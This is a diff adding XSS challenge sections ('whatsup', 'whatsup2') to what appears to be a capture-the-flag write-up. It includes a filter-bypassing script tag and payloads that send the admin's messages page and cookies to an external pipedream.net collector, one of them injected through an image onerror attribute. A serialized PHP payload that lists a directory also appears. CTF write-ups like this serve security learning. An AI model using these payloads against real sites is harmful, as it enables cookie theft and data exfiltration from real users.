@@ -192,3 +192,38 @@ a:3:{s:2:"ak";s:2:"hi";s:1:"a";s:1:"e";s:1:"d";s:23:"print_r(scandir('./'));";}
 which gave me the directory listing and I was able to find the hidden file.
 
 # xxs
+
+## whatsup
+After reading a lot of [guides](https://ironhackers.es/tutoriales/csrf-xss-filter-bypass/) I first tried simple injection:
+```
+<SCrIpT>alert(1)</SCrIpT>
+```
+it worked!
+We know the admin is checking messages every minute. So admin will run whatever code I injected as well.
+So then I tried another injection, with [pipedream](https://pipedream.com/) I opened a new pipe to check any incoming requests.
+```
+<SCrIpT>var x1=new XMLHttpRequest(); x1.open("GET", "https://eo2awd21wqscuhf.m.pipedream.net/?1=test", false); x1.send()</SCrIpT>
+```
+it also worked! my pipdream line got 2 requests from myself and the admin `client ip: 35.242.202.31`.
+```
+<SCRIPT>var x1=new XMLHttpRequest(); x1.open("GET", "/messages", false); x1.send();var x2=new XMLHttpRequest(); x2.open("GET", "https://eo2awd21wqscuhf.m.pipedream.net/?1=" + btoa(unescape(x1.responseText)), false); x2.send();</SCrIpT>
+```
+With using this I was able to spy on admin's messages page and see their messages. But it was useless, flag was not there.
+I was very very confused. I was sure the flag is somewhere in the admin's messages.
+I thought no way it is admin's cookie, because my own cookies from this website is `HttpOnly`. It is uncrackable. So I thought admin's cookie would be the same and that cookies is not the way to go. `document.cookie` on myself is empty.
+But I decided to try anyway after a while.
+```
+<SCRIPT>var x2=new XMLHttpRequest(); x2.open("GET", "https://eo2awd21wqscuhf.m.pipedream.net/?1=f_" + document.cookie, false);  x2.send();</SCrIpT>
+answer: https://eo2awd21wqscuhf.m.pipedream.net/?1=f_flag=BFS{XSS_M0R3_L!K3_FR33_C00K!35}
+```
+Somehow the admin's cookie is NOT `HttpOnly` and it is the flag. Shrug
+
+## whatsup2
+Very easy after whatsup1. Same thing except messages are sanitized so cannot be injected. But the image link is not, so we can inject there still.
+What I entered for the image:
+```
+1" onerror="var x2=new XMLHttpRequest(); x2.open('GET', 'https://eo2awd21wqscuhf.m.pipedream.net/?1=f_' + document.cookie, false);  x2.send();
+https://eo2awd21wqscuhf.m.pipedream.net/?1=f_flag=BFS{4n_1m4g3_79_w0r7h_a_7h0u54nd_w0rd5}
+```
+
+# jwt
